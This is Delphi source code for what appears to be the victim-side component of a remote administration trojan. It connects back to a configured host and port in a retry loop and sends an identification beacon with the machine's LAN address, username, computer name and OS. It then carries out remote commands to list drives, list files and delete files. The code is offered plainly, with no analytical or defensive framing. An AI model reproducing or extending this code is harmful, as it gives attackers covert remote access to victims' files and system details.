Program prjEE;
uses
  Windows,
  Winsock,
  Classes,
  untFunc,
  Unit1 in 'Unit1.pas';

Type TServer = Class(TObject)
Private
  hSocket: TSocket;
  Addr: TSockAddrIn;
  wsaData: TWSAData;
Public
  Procedure Connect;
  Procedure SendData(sData: String);
  Procedure ReceiveData(sSocket: TSocket; Buffer: PByte);
End;

Var
  Server: TServer;
  Close: Boolean;
  hPort: Integer;
  hHost: String;

Procedure TServer.Connect;
Var
  Buffer: Array[0..8192] Of Char;
  iRecv: Integer;
Begin
  If (WSAStartup($0202, wsaData) <> 0) Then
  Begin
    //Unable to start winsock, unable to continue
    Exit;
  End;

  Close := False;
  Repeat

  hSocket := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.Sin_family := AF_INET;
  Addr.sin_port := htons(hPort);
  Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(hHost)));

  //Connecting to GetIPFromHost(hHost)

  If (Winsock.Connect(hSocket, Addr, SizeOf(Addr)) = 0) Then
  Begin
    //Connected to host
    SendData('Connect|' + 'admin' + '|' + 'Identification' + '|' + GetLAN + '|' + sUsername + '|' + sComputer + '|' + 'Account Type' + '|' + GetOS + '|' + '0.1b' + '|' + 'Ping');

    //Attempt to receieve data
    ZeroMemory(@Buffer, SizeOf(Buffer));
    iRecv := Recv(hSocket, Buffer, SizeOf(Buffer), 0);

    While ((iRecv > 0) And (iRecv <> INVALID_SOCKET)) Do
    Begin
      ReceiveData(hSocket, @Buffer);
      ZeroMemory(@Buffer, SizeOf(Buffer));
      iRecv := Recv(hSocket, Buffer, SizeOf(Buffer), 0);
    End;

    //Disconnected
    CloseSocket(hSocket);
  End;

  Sleep(3000);
  Until (Close);
  WSACleanup();
End;

Procedure TServer.SendData(sData: String);
Var
  Len: LongInt;
Begin
  Len := Length(sData);
  Send(hSocket, sData[1], Len, 0);
End;

Procedure TServer.ReceiveData(sSocket: TSocket; Buffer: PByte);
Var
  sData: String;
  sCmd: String;
  sDat: TStringList;
Begin
  sData := String(Buffer);

  If Length(sData) > 0 Then
  Begin
    sDat := Explode('|', sData);
    sCmd := sDat[0];

    If sCmd = 'ListDrives' Then
    Begin
      SendData('Drives|' + ListAllDrives);
    End;

    If sCmd = 'ListFiles' Then
    Begin
      SendData('Files|' +ListFiles(sDat[1]));
    End;

    If sCmd = 'DeleteFile' Then
    Begin
      DelFile(sDat[1]);
      SendData('Status|File Deleted');
    End;

  End;
End;

Begin
  Server := TServer.Create;
  hHost := '127.0.0.1';
  hPort := 4181;
  Server.Connect;
End.
